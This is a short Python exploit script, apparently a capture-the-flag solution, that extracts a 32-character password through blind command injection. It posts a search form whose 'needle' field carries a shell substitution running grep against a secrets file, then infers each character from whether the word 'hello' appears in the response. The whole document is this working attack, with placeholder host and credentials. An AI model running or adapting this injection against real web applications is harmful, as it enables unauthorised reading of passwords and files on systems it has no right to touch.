import requests
from requests.auth import HTTPBasicAuth
from string import ascii_lowercase, ascii_uppercase, digits

url = "http://localhost"
auth = HTTPBasicAuth('username', 'password')

charset = ascii_lowercase + ascii_uppercase + digits 

password = ""

while len(password) < 32:
    for char in charset:
        payload = f"$(grep -E ^{password}{char}.* /pathname)"
        data = {'needle': payload, 'submit': 'Search'}

        try:
            response = requests.post(url, auth=auth, data=data)
        except Exception as e:
            print(f"Erreur de requête : {e}")
            continue
        
        if "hello" not in response.text:
            password += char
            print(f"Found character: {char} -> Current password: {password}")
            break

print(f"Password found: {password}")
